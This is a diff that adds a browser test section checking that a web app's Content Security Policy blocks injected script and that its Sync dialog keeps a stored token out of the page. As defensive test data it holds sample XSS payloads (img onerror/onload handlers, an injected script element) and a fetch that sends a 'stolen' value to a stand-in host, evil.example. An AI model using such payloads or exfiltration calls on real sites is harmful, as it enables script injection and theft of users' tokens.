@@ -15601,6 +15601,78 @@ await section("desktop: Console history column", async () => {
   await ctx.close();
 });
 
+await section("security: the Content Security Policy holds, and the Sync dialog doesn't hold the token", async () => {
+  const { ctx, page, errors } = await openApp({
+    setup: async (c) => {
+      await c.addInitScript(() => {
+        window.__csp = [];
+        document.addEventListener("securitypolicyviolation", (e) =>
+          window.__csp.push(e.violatedDirective + " " + e.blockedURI),
+        );
+      });
+    },
+  });
+  for (const tab of ["todo", "console", "budget", "home"]) await page.evaluate((t) => activateTab(t), tab);
+  await page.waitForTimeout(200);
+  check(
+    "using the app breaks no CSP rule",
+    (await page.evaluate(() => window.__csp.length)) === 0,
+    await page.evaluate(() => window.__csp),
+  );
+  const blocked = await page.evaluate(async () => {
+    window.__pwned = 0;
+    const d = document.createElement("div");
+    d.innerHTML = '<img src="data:," onerror="window.__pwned=1"><img src=x onload="window.__pwned=1">';
+    document.body.appendChild(d);
+    const s = document.createElement("script");
+    s.textContent = "window.__pwned=1";
+    document.body.appendChild(s);
+    await new Promise((r) => setTimeout(r, 200));
+    d.remove();
+    s.remove();
+    let sent = true;
+    try {
+      await fetch("https://evil.example/?t=stolen");
+    } catch (e) {
+      sent = false;
+    }
+    await new Promise((r) => setTimeout(r, 200)); // the violation event comes just after the fetch fails
+    return { pwned: window.__pwned, sent, why: window.__csp.some((v) => v.startsWith("connect-src")) };
+  });
+  check(
+    "injected handlers and scripts don't run, and data can't be sent to another site",
+    blocked.pwned === 0 && !blocked.sent && blocked.why,
+    blocked,
+  );
+  check("no JS errors", errors.length === 0, errors);
+  await ctx.close();
+
+  const s = await openApp({
+    seed: { "sync-token": "ghp_notARealTokenJustForThisTest" },
+    route: (r) => r.fulfill({ status: 200, contentType: "application/json", body: "[]" }),
+  });
+  const dlg = await s.page.evaluate(() => {
+    openSyncModal();
+    const f = document.getElementById("modal-token");
+    return {
+      value: f.value,
+      inPage: document.documentElement.outerHTML.includes("ghp_notARealToken"),
+      label: f.closest("label").textContent,
+    };
+  });
+  check(
+    "the Sync dialog leaves the token out of the page and says it's connected",
+    dlg.value === "" && !dlg.inPage && /connected/.test(dlg.label),
+    dlg,
+  );
+  await s.page.click("#modal-backdrop .modal-btn.primary");
+  check(
+    "saving with the field blank keeps the token",
+    (await s.page.evaluate(() => localStorage.getItem("sync-token"))) === "ghp_notARealTokenJustForThisTest",
+  );
+  await s.ctx.close();
+});
+
 await browser.close();
 server.close();
 console.log(`\n${passed} checks passed, ${failures.length} failed`);
